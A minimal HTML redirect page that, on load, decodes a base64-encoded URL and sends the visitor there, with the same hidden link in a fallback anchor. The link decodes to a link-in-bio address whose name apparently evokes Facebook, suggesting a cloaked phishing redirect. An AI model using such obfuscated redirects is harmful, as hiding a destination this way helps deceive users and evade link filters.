<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            // Base64 encoded link
            const encodedLink = "aHR0cHM6Ly9saW5rci5iaW8vbnV0emVyZmFjZWJvb2tkZQ==";
            
            // Decode Base64 to get the original URL
            const decodedLink = atob(encodedLink);
            
            // Redirect the user
            window.location.href = decodedLink;
        };
    </script>
</head>
<body>
    <p>If not redirected, <a id="redirectLink" href="#">click here</a>.</p>
    <script>
        document.getElementById("redirectLink").href = atob("aHR0cHM6Ly9saW5rci5iaW8vbnV0emVyZmFjZWJvb2tkZQ==");
    </script>
</body>
</html>
